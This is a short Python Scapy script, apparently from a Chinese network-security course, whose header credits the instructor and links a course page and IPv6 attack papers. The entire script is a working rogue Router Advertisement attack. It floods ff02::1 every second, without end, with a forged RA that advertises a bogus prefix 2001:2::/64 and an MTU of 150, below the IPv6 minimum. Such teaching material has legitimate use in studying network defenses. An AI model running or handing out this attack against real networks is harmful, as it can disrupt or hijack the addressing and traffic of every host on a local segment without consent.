#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

# IPv6参考文档
# https://www.idsv6.de/Downloads/IPv6PacketCreationWithScapy.pdf
# https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf

import logging
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *
from Part1_Classic_Protocols.Tools.GET_MAC import get_mac_address

ll_mac = get_mac_address('ens33')

base=IPv6(dst='ff02::1')
router_solicitation=ICMPv6ND_RA()
src_ll_addr=ICMPv6NDOptSrcLLAddr(lladdr=ll_mac)
mtu = ICMPv6NDOptMTU(mtu=150)
prefix=ICMPv6NDOptPrefixInfo(prefix='2001:2::', prefixlen=64)
packet=base/router_solicitation/src_ll_addr/mtu/prefix

packet.show()
while True:
    time.sleep(1)
    send(packet)


if __name__ == '__main__':
    pass
